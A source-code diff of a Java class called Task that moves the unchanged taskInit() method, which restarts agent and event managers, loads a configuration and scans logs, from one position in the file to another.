@@ -65,50 +65,6 @@ public class Task {
     }
 
     /**
-     * Task init.
-     * 
-     * @return true, if successful
-     */
-    public boolean taskInit() {
-        debug.trace("TaskInit");
-
-        agentManager.stopAll();
-        eventManager.stopAll();
-
-        if (device != null) {
-            device.refreshData();
-        }
-
-        conf = new Conf();
-
-        if (conf.load() == false) {
-            debug.trace("TaskInit - Load Conf FAILED");
-
-            return false;
-        }
-
-        Msg.demo("Configuration... OK\n");
-
-        if (logCollector != null) {
-            logCollector.ScanLogs();
-        }
-
-        // Da qui in poi inizia la concorrenza dei thread
-        if (eventManager.startAll() == false) {
-            debug.trace("TaskInit - eventManager FAILED");
-            return false;
-        }
-
-        if (agentManager.startAll() == false) {
-            debug.trace("TaskInit - agentManager FAILED");
-            return false;
-        }
-
-        debug.trace("TaskInit - agents started");
-        return true;
-    }
-
-    /**
      * Check actions.
      * 
      * @return true, if successful
@@ -156,5 +112,49 @@ public class Task {
             Utils.Sleep(600);
         }
 
+    }
+
+    /**
+     * Task init.
+     * 
+     * @return true, if successful
+     */
+    public boolean taskInit() {
+        debug.trace("TaskInit");
+
+        agentManager.stopAll();
+        eventManager.stopAll();
+
+        if (device != null) {
+            device.refreshData();
+        }
+
+        conf = new Conf();
+
+        if (conf.load() == false) {
+            debug.trace("TaskInit - Load Conf FAILED");
+
+            return false;
+        }
+
+        Msg.demo("Configuration... OK\n");
+
+        if (logCollector != null) {
+            logCollector.ScanLogs();
+        }
+
+        // Da qui in poi inizia la concorrenza dei thread
+        if (eventManager.startAll() == false) {
+            debug.trace("TaskInit - eventManager FAILED");
+            return false;
+        }
+
+        if (agentManager.startAll() == false) {
+            debug.trace("TaskInit - agentManager FAILED");
+            return false;
+        }
+
+        debug.trace("TaskInit - agents started");
+        return true;
     }
 }
